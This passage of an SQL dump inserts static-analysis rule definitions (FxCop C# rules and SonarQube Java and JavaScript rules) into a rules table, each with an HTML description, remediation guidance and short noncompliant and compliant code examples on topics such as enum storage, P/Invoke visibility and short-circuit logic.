            Case-insensitive comparison is used for Visual Basic keywords, and case-sensitive comparison is used for the other languages.
</p>
<h2>How to Fix Violations</h2>
<p>
            Select a name that does not appear in the list of keywords.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            You can suppress a warning from this rule if you are convinced that the identifier will not confuse users of the API, and that  the library is usable in all available languages in the .NET Framework.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182248.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182248.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812551, 1510817812551, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (602, 'CA1028: Enum storage should be Int32', 'EnumStorageShouldBeInt32', 'CA1028', 'fxcop', '<h2>Cause</h2>
<p>
            The underlying type of a public enumeration is not System.Int32.
</p>
<h2>Rule Description</h2>
<p>
            An enumeration is a value type that defines a set of related named constants. By default, the System.Int32 data type is used to store the constant value. Even though you can change this underlying type, it is not necessary or recommended for most scenarios. Note that no significant performance gain is achieved by using a data type that is smaller than Int32. If you cannot use the default data type, you should use one of the Common Language System (CLS)-compliant integral types, <code>Byte</code>, Int16, Int32, or Int64 to make sure that all values of the enumeration can be represented in CLS-compliant programming languages.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, unless size or compatibility issues exist, use Int32. For situations where Int32 is not large enough to hold the values, use Int64. If backward compatibility requires a smaller data type, use <code>Byte</code> or Int16.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule only if backward compatibility issues require it. In applications, failure to comply with this rule usually does not cause problems. In libraries, where language interoperability is required, failure to comply with this rule might adversely affect your users.
</p>
<h2>Example of a Violation</h2>

<h3>Description</h3>
<p>
                The following example shows two enumerations that do not use the recommended underlying data type.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace DesignLibrary
{
   [Flags]
   public enum Days : uint
   {
      None        = 0,
      Monday      = 1,
      Tuesday     = 2,
      Wednesday   = 4,
      Thursday    = 8,
      Friday      = 16,
      All         = Monday| Tuesday | Wednesday | Thursday | Friday
   }

   public enum Color :sbyte
   {
      None        = 0,
      Red         = 1,
      Orange      = 3,
      Yellow      = 4
   }
}
</pre>





</p>
<h2>Example of How to Fix</h2>

<h3>Description</h3>
<p>
                The following example fixes the previous violation by changing the underlying data type to Int32.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    [Flags]
    public enum Days : int
    {
        None        = 0,
        Monday      = 1,
        Tuesday     = 2,
        Wednesday   = 4,
        Thursday    = 8,
        Friday      = 16,
        All         = Monday| Tuesday | Wednesday | Thursday | Friday
    }

    public enum Color : int
    {
        None        = 0,
        Red         = 1,
        Orange      = 3,
        Yellow      = 4
    }
}
</pre>





</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:EnumsShouldHaveZeroValue}<br/>




                {rule:fxcop:MarkEnumsWithFlags}<br/>




                {rule:fxcop:DoNotMarkEnumsWithFlags}<br/>




                {rule:fxcop:DoNotNameEnumValuesReserved}<br/>




                {rule:fxcop:DoNotPrefixEnumValuesWithTypeName}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182147.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182147.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812552, 1510817812553, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (708, '"toArray" should be passed an array of the proper type', 'S3020', NULL, 'squid', '<p>Given no arguments, the <code>Collections.toArray</code> method returns an <code>Object []</code>, which will cause a
<code>ClassCastException</code> at runtime if you try to cast it to an array of the proper class. Instead, pass an array of the correct type in to the
call.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String [] getStringArray(List&lt;String&gt; strings) {
  return (String []) strings.toArray();  // Noncompliant; ClassCastException thrown
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public String [] getStringArray(List&lt;String&gt; strings) {
  return strings.toArray(new String[0]);
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812699, 1510817812699, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (709, 'An open curly brace should be located at the beginning of a line', 'LeftCurlyBraceStartLineCheck', 'S1106', 'squid', '<p>Shared coding conventions make it possible to collaborate efficiently. This rule makes it mandatory to place the open curly brace at the beginning
of a line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void myMethod {  // Noncompliant
  if(something) {  // Noncompliant
    executeTask();
  } else {  // Noncompliant
    doSomethingElse();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void myMethod
{
  if(something)
  {
    executeTask();
  } else
  {
    doSomethingElse();
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817812700, 1510817812701, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (603, 'CA2145: Transparent methods should not be decorated with the SuppressUnmanagedCodeSecurityAttribute', 'TransparentMethodsShouldNotUseSuppressUnmanagedCodeSecurity', 'CA2145', 'fxcop', '<h2>Cause</h2>
<p>
            A transparent method, a method that is marked with the <code>SecuritySafeCriticalAttribute</code> method, or a type that contains a method is marked with the <code>SuppressUnmanagedCodeSecurityAttribute</code> attribute.
</p>
<h2>Rule Description</h2>
<p>
            Methods decorated with the <code>SuppressUnmanagedCodeSecurityAttribute</code> attribute have an implicit LinkDemand placed upon any method that calls it. This LinkDemand requires that the calling code be security critical. Marking the method that uses SuppressUnmanagedCodeSecurity with the <code>SecurityCriticalAttribute</code> attribute makes this requirement more obvious for callers of the method.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, mark the method or type with the <code>SecurityCriticalAttribute</code> attribute.
</p>
<h2>When to Suppress Warnings</h2>

<h3>Code</h3>
<p>










            <pre>
using System;
using System.Runtime.InteropServices;
using System.Security;

namespace TransparencyWarningsDemo
{

    public class SafeNativeMethods
    {
        // CA2145 violation - transparent method marked SuppressUnmanagedCodeSecurity.  This should be fixed by 
        // marking this method SecurityCritical.
        [DllImport("kernel32.dll", SetLastError = true)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool Beep(uint dwFreq, uint dwDuration);
    }
}
</pre>





</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997570.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997570.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '5min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812553, 1510817812554, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (604, 'CA1034: Nested types should not be visible', 'NestedTypesShouldNotBeVisible', 'CA1034', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible type contains an externally visible type declaration. Nested enumerations and protected types are exempt from this rule.
</p>
<h2>Rule Description</h2>
<p>
            A nested type is a type declared within the scope of another type. Nested types are useful for encapsulating private implementation details of the containing type. Used for this purpose, nested types should not be externally visible.
            Do not use externally visible nested types for logical grouping or to avoid name collisions; instead, use namespaces.
            Nested types include the notion of member accessibility, which some programmers do not understand clearly.
            Protected types can be used in subclasses and nested types in advance customization scenarios.
</p>
<h2>How to Fix Violations</h2>
<p>
            If you do not intend the nested type to be externally visible, change the type''s accessibility. Otherwise, remove the nested type from its parent. If the purpose of the nesting is to categorize the nested type, use a namespace to create the hierarchy instead.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182162.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182162.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812555, 1510817812555, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (713, 'Class names should not shadow interfaces or superclasses', 'S2176', NULL, 'squid', '<p>While it''s perfectly legal to give a class the same simple name as a class in another package that it extends or interface it implements, it''s
confusing and could cause problems in the future. </p>
<h2>Noncompliant Code Example</h2>
<pre>
package my.mypackage;

public class Foo implements a.b.Foo { // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
package my.mypackage;

public class FooJr implements a.b.Foo {
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812705, 1510817812705, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (714, 'Inappropriate "Collection" calls should not be made', 'S2175', NULL, 'squid', '<p>A couple <code>Collection</code> methods can be called with arguments of an incorrect type, but doing so is pointless and likely the result of
using the wrong argument. This rule will raise an issue when the type of the argument to <code>List.contains</code> or <code>List.remove</code> is
unrelated to the type used for the list declaration.</p>
<h2>Noncompliant Code Example</h2>
<pre>
List&lt;String&gt; list = new ArrayList&lt;String&gt;();
Integer integer = Integer.valueOf(1);

if (list.contains(integer)) {  // Noncompliant. Always false.
  list.remove(integer); // Noncompliant. list.add(integer) doesn''t compile, so this will always return false
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QwFlAQ">CERT, EXP04-J.</a> - Do not pass arguments to certain Java Collections
  Framework methods that are a different type than the collection parameter type </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert', false, 'HTML', 1510817812706, 1510817812706, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (605, 'CA2234: Pass System.Uri objects instead of strings', 'PassSystemUriObjectsInsteadOfStrings', 'CA2234', 'fxcop', '<h2>Cause</h2>
<p>
            A call is made to a method that has a string parameter whose name contains "uri", "Uri", "urn", "Urn", "url", or "Url"; and the declaring type of the method contains a corresponding method overload that has a <code>System.Uri</code> parameter.
</p>
<h2>Rule Description</h2>
<p>
            A parameter name is split into tokens based on the camel casing convention, and then each token is checked to see whether it equals "uri", "Uri", "urn", "Urn", "url", or "Url". If there is a match, the parameter is assumed to represent a uniform resource identifier (URI). A string representation of a URI is prone to parsing and encoding errors, and can lead to security vulnerabilities. The <code>Uri</code> class provides these services in a safe and secure manner. When there is a choice between two overloads that differ only regarding the representation of a URI, the user should choose the overload that takes a <code>Uri</code> argument.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, call the overload that takes the <code>Uri</code> argument.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the string parameter does not represent a URI.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:StringUriOverloadsCallSystemUriOverloads}<br/>




                {rule:fxcop:UriPropertiesShouldNotBeStrings}<br/>




                {rule:fxcop:UriParametersShouldNotBeStrings}<br/>




                {rule:fxcop:UriReturnValuesShouldNotBeStrings}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182360.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182360.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812556, 1510817812556, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (606, 'CA1401: P/Invokes should not be visible', 'PInvokesShouldNotBeVisible', 'CA1401', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected method in a public type has the <code>System.Runtime.InteropServices.DllImportAttribute</code> attribute (also implemented by the <code>Declare</code> keyword in Visual Basic).
</p>
<h2>Rule Description</h2>
<p>
            Methods that are marked with the <code>DllImportAttribute</code> attribute (or methods that are defined by using the <code>Declare</code> keyword in Visual Basic) use Platform Invocation Services to access unmanaged code. Such methods should not be exposed. By keeping these methods private or internal, you make sure that your library cannot be used to breach security by allowing callers access to unmanaged APIs that they could not call otherwise.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the access level of the method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182209.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182209.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812557, 1510817812558, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (607, 'CA1036: Override methods on comparable types', 'OverrideMethodsOnComparableTypes', 'CA1036', 'fxcop', '<h2>Cause</h2>
<p>
            A public or protected type implements the <code>System.IComparable</code> interface and does not override <code>Object.Equals</code> or does not overload the language-specific operator for equality, inequality, less than, or greater than. The rule does not report a violation if the type inherits only an implementation of the interface.
</p>
<h2>Rule Description</h2>
<p>
            Types that define a custom sort order implement the <code>IComparable</code> interface. The <code>CompareTo</code> method returns an integer value that indicates the correct sort order for two instances of the type. This rule identifies types that set a sort order; this implies that the ordinary meaning of equality, inequality, less than, and greater than do not apply. When you provide an implementation of <code>IComparable</code>, you must usually also override <code>Equals</code> so that it returns values that are consistent with <code>CompareTo</code>. If you override <code>Equals</code> and are coding in a language that supports operator overloads, you should also provide operators that are consistent with <code>Equals</code>.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, override <code>Equals</code>. If your programming language supports operator overloading, supply the following operators:
            <ul>
              <li>
                op_Equality
              </li>
              <li>
                op_Inequality
              </li>
              <li>
                op_LessThan
              </li>
              <li>
                op_GreaterThan
              </li>
            </ul>
            In C#, the tokens that are used to represent these operators are as follows: ==, !=, &lt;, and &gt;.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule when the violation is caused by missing operators and your programming language does not support operator overloading, as is the case with Visual Basic .NET. It is also safe to suppress a warning for from this rule when it fires on equality operators other than op_Equality if you determine that implementing the operators does not make sense in your application context. However, you should always over op_Equality and the == operator if you override Object.Equals.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182163.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182163.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812558, 1510817812559, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1166, 'Statements should be on separate lines', 'OneStatementPerLine', NULL, 'javascript', '<p>For better readability, do not put more than one statement on a single line.</p>

<h2>Noncompliant Code Example</h2>

<pre>
if(someCondition) doSomething();
</pre>

<h2>Compliant Solution</h2>

<pre>
if(someCondition) {
  doSomething();
}
</pre>

<h2>Exceptions</h2>

<p>Anonymous functions containing a single statement are ignored.</p>

<pre>
onEvent(function() { doSomething(); });               // Compliant
onEvent(function(p) { doSomething(); return p %2 ;}); // Noncompliant
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817813290, 1510817813290, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1167, '"delete" should be used only with object properties', 'S3001', NULL, 'javascript', '<p>The semantics of the <code>delete</code> operator are a bit tricky, and it can only be reliably used to remove properties from objects. Pass anything else to it, and you may or may not get the desired result.</p>

<h2>Noncompliant Code Example</h2>
<pre>
var x  = 1;
delete x;       // Noncompliant

function foo(){
..
}

delete foo;  // Noncompliant
</pre>

<h2>Compliant Solution</h2>
<pre>
var obj = {
  x:1,
  foo: function(){
  ...
  }
};
delete obj.x;
delete obj.foo;

</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817813291, 1510817813291, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (608, 'CA2003: Do not treat fibers as threads', 'DoNotTreatFibersAsThreads', 'CA2003', 'fxcop', '<h2>Cause</h2>
<p>
            A managed thread is being treated as a Win32 thread.
</p>
<h2>Rule Description</h2>
<p>
            Do not assume a managed thread is a Win32 thread. It is a fiber. The common language runtime (CLR) will run managed threads as fibers in the context of real threads that are owned by SQL. These threads can be shared across AppDomains and even databases in the SQL Server process. Using managed thread local storage will work, but you may not use unmanaged thread local storage or assume that your code will run on the current OS thread again. Do not change settings such as the locale of the thread. Do not call CreateCriticalSection or CreateMutex via P/Invoke because they require that the thread that enters a lock must also exit the lock. Because this will not be the case when you use fibers, Win32 critical sections and mutexes will be useless in SQL. You may safely use most of the state on a managed System.Thread object. This includes managed thread local storage and the current user interface (UI) culture of the thread. However, for programming model reasons, you will not be able to change the current culture of a thread when you  use SQL; this will be enforced through a new permission.
</p>
<h2>How to Fix Violations</h2>
<p>
            Examine your usage of threads and change your code accordingly.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            You should not suppress this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182291.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182291.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '20min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812560, 1510817812560, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (609, 'CA1001: Types that own disposable fields should be disposable', 'TypesThatOwnDisposableFieldsShouldBeDisposable', 'CA1001', 'fxcop', '<h2>Cause</h2>
<p>
            A class declares and implements an instance field that is a <code>System.IDisposable</code> type and the class does not implement <code>IDisposable</code>.
</p>
<h2>Rule Description</h2>
<p>
            A class implements the <code>IDisposable</code> interface to dispose of unmanaged resources that it owns. An instance field that is an <code>IDisposable</code> type indicates that the field owns an unmanaged resource. A class that declares an <code>IDisposable</code> field indirectly owns an unmanaged resource and should implement the <code>IDisposable</code> interface. If the class does not directly own any unmanaged resources, it should not implement a finalizer.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, implement <code>IDisposable</code> and from the <code>IDisposable.Dispose</code> method call the <code>Dispose</code> method of the field.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:DisposableFieldsShouldBeDisposed}<br/>




                {rule:fxcop:DisposableTypesShouldDeclareFinalizer}<br/>




                {rule:fxcop:DisposeMethodsShouldCallBaseClassDispose}<br/>




                {rule:fxcop:TypesThatOwnNativeResourcesShouldBeDisposable}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182172.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182172.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812561, 1510817812561, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (715, 'Short-circuit logic should be used in boolean contexts', 'S2178', NULL, 'squid', '<p>The use of non-short-circuit logic in a boolean context is likely a mistake - one that could cause serious program errors as conditions are
evaluated under the wrong circumstances.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(getTrue() | getFalse()) { ... } // Noncompliant; both sides evaluated
</pre>
<h2>Compliant Solution</h2>
<pre>
if(getTrue() || getFalse()) { ... }  // true short-circuit logic
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/g4FtAg">CERT, EXP46-C.</a> - Do not use a bitwise operator with a Boolean-like operand
  </li>
</ul>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert', false, 'HTML', 1510817812707, 1510817812707, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (718, '"Serializable" inner classes of "Serializable" classes should be static', 'S2059', NULL, 'squid', '<p>Serializing a non-<code>static</code> inner class will result in an attempt at serializing the outer class as well. If the outer class is actually
serializable, then the serialization will succeed but possibly write out far more data than was intended. </p>
<p>Making the inner class <code>static</code> (i.e. "nested") avoids this problem, therefore inner classes should be <code>static</code> if possible.
However, you should be aware that there are semantic differences between an inner class and a nested one: </p>
<ul>
  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>
  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class Raspberry implements Serializable {
  // ...

  public class Drupelet implements Serializable {  // Noncompliant; output may be too large
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Raspberry implements Serializable {
  // ...

  public static class Drupelet implements Serializable {
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/O4CpAQ">CERT, SER05-J.</a> - Do not serialize instances of inner classes </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,pitfall,serialization', false, 'HTML', 1510817812710, 1510817812710, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (610, 'CA1006: Do not nest generic types in member signatures', 'DoNotNestGenericTypesInMemberSignatures', 'CA1006', 'fxcop', '<h2>Cause</h2>
<p>
            An externally visible member has a signature that contains a nested type argument.
</p>
<h2>Rule Description</h2>
<p>
            A nested type argument is a type argument that is also a generic type. To call a member whose signature contains a nested type argument, the user must instantiate one generic type and pass this type to the constructor of a second generic type. The required procedure and syntax are complex and should be avoided.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the design to remove the nested type argument.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule. Providing generics in a syntax that is easy to understand and use reduces the time that is required to learn and increases the adoption rate of new libraries.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>




                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>




                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>




                {rule:fxcop:DoNotExposeGenericLists}<br/>




                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>




                {rule:fxcop:UseGenericEventHandlerInstances}<br/>




                {rule:fxcop:UseGenericsWhereAppropriate}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182144.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182144.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '1h', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812562, 1510817812562, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (611, 'CA1044: Properties should not be write only', 'PropertiesShouldNotBeWriteOnly', 'CA1044', 'fxcop', '<h2>Cause</h2>
<p>
            The public or protected property has a set accessor but does not have a get accessor.
</p>
<h2>Rule Description</h2>
<p>
            Get accessors provide read access to a property and set accessors provide write access. Although it is acceptable and often necessary to have a read-only property, the design guidelines prohibit the use of write-only properties. This is because letting a user set a value and then preventing the user from viewing the value does not provide any security. Also, without read access, the state of shared objects cannot be viewed, which limits their usefulness.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, add a get accessor to the property. Alternatively, if the behavior of a write-only property is necessary, consider converting this property to a method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is strongly recommended that you do not suppress a warning from this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182165.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182165.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812563, 1510817812563, 1);
